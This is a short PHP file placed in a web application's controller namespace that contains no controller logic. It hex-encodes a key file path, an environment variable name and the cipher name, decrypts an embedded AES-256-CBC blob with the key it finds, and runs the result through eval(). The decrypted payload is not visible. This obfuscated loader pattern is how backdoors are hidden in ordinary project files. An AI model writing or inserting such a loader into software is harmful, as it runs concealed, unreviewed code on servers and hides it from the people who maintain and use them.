<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('wPoJOCttcw57A3PYnmVpAg==');

$c=base64_decode(

'EbKkvxdkF3Fou/HXPE6RIkLLZEsypOVUmAOMyUATDV003M8ZpBLGB2ARQo0cLTWSpNQrR4WS+nEF' .
'jNsX0EGwVx7rKqWptPCkuB00LoyRK3ryfySaggF6xTuxE6e94JdsVGFchRrly9LGrEQa8sVuiAy4' .
'YE8Xoy3XmFhdJfKEKv2I68dQJJAM1NbDlF6JtrPHekNLf9bYLrXj1+b59+C3jBmKJmWXvzPGhBrw' .
'ALcwnZC5ENk177IcRdlhHnpz6H/OvjqFoW6XgECyqe+LsI/rFw=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

